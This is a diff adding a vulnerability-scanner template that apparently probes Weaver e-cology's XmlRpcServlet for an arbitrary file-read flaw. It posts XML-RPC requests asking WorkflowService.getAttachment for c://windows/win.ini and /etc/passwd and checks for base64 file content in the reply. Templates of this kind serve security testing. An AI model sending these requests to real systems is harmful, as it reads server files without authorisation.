@@ -1,0 +1,26 @@
+name: weaver-ecology-XmlRpcServlet-FileRead
+groups:
+  rules1:
+    - method: POST
+      path: "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>c://windows/win.ini</string></value></param></params></methodCall>
+      expression: |
+        response.status == 200 && response.body.bcontains(b"<methodResponse><params><param><value><base64>")
+
+  rules2:
+    - method: POST
+      path: "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>/etc/passwd</string></value></param></params></methodCall>
+      expression: |
+        response.status == 200 && response.body.bcontains(b"<methodResponse><params><param><value><base64>")
+
+detail:
+  author: akun
